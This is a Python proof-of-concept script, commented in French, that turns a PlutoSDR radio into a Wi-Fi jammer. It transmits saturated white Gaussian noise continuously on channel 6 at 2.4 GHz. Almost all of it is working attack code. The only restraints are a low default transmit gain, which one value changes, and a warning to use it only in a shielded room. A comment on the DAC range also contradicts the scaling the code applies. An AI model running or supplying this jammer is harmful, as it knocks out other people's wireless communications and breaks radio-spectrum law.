import time
import numpy as np
import adi

# =============================================================================
# PROJET CyberSTAT - Preuve de Concept (PoC)
# Script : Générateur de bruit (Spot Jamming) sur canal Wi-Fi (2.4 GHz)
# AVERTISSEMENT : Ce script ne doit être exécuté qu'en chambre anéchoïque
# ou en cage de Faraday. L'émission en espace ouvert est strictement interdite.
# =============================================================================

# --- 1. Paramètres de la Cible (Wi-Fi Canal 6 par défaut) ---
# Fréquence centrale du Canal 6 : 2437 MHz
CENTER_FREQ = int(2437e6) 
# Largeur d'un canal Wi-Fi standard : 20 MHz
SAMPLE_RATE = int(20e6)    

# --- 2. Paramètres de Sécurité (Fail-Safe) ---
# -80 dB = Puissance minimale absolue (Sécurité activée)
#   0 dB = Puissance maximale du PlutoSDR (Pour tests en salle isolée uniquement)
TX_GAIN = -80 

print("==================================================")
print("Initialisation de l'attaque (Wi-Fi Jamming)")
print("==================================================")

try:
    # --- 3. Connexion au PlutoSDR ---
    print("[*] Connexion au module ADALM-PLUTO (IP par défaut: 192.168.2.1)...")
    sdr = adi.Pluto("ip:192.168.2.1")
    
    # --- 4. Configuration de la chaîne d'émission (TX) ---
    sdr.sample_rate = SAMPLE_RATE
    sdr.tx_rf_bandwidth = SAMPLE_RATE # On ouvre le filtre à 20 MHz
    sdr.tx_lo = CENTER_FREQ           # On cible la fréquence centrale
    sdr.tx_hardwaregain_chan0 = TX_GAIN
    
    # On active le buffer cyclique : le Pluto répétera le même signal à l'infini
    # sans avoir besoin de recalculer avec le processeur de l'ordinateur.
    sdr.tx_cyclic_buffer = True 
    
    print(f"[+] SDR configuré sur {CENTER_FREQ / 1e6} MHz (Largeur: {SAMPLE_RATE / 1e6} MHz)")
    print(f"[+] Gain matériel (TX) : {TX_GAIN} dB")

    # --- 5. Génération du signal destructeur (AWGN) ---
    print("[*] Génération mathématique du Bruit Blanc Gaussien (AWGN)...")
    # Pour saturer un récepteur OFDM (Wi-Fi), un bruit blanc gaussien aléatoire
    # est le plus efficace. On génère un million d'échantillons complexes (I/Q).
    num_samps = 1000000 
    
    # Création d'échantillons aléatoires I (Réel) et Q (Imaginaire)
    # On les multiplie par 2^14 car le DAC du PlutoSDR a une résolution de 12 bits 
    # (les valeurs acceptées vont de -2048 à +2047, on sature volontairement le signal)
    i_signal = np.random.normal(0, 1, num_samps)
    q_signal = np.random.normal(0, 1, num_samps)
    
    # Combinaison en nombres complexes
    iq_samples = i_signal + 1j * q_signal
    
    # Normalisation pour exploiter toute la dynamique du convertisseur numérique/analogique
    iq_samples = iq_samples / np.max(np.abs(iq_samples)) * (2**14)
    
    # --- 6. Émission ---
    print("[!] DÉBUT DE L'ÉMISSION. Le signal est en cours de transmission.")
    print("[i] Appuyez sur CTRL+C pour stopper l'attaque et sécuriser le matériel.")
    
    # Envoi au PlutoSDR (le flag tx_cyclic_buffer s'occupe de la boucle infinie)
    sdr.tx(iq_samples)
    
    # Maintien du script en vie
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[!] Interruption utilisateur détectée.")
except Exception as e:
    print(f"\n[-] Erreur critique : {e}")
finally:
    # --- 7. Nettoyage et Sécurisation ---
    # Étape vitale pour ne pas laisser le PlutoSDR émettre après l'arrêt du script
    try:
        print("[*] Arrêt de l'émission TX et destruction du buffer...")
        sdr.tx_destroy_buffer()
        print("[+] Matériel sécurisé. Fin du programme.")
    except:
        pass
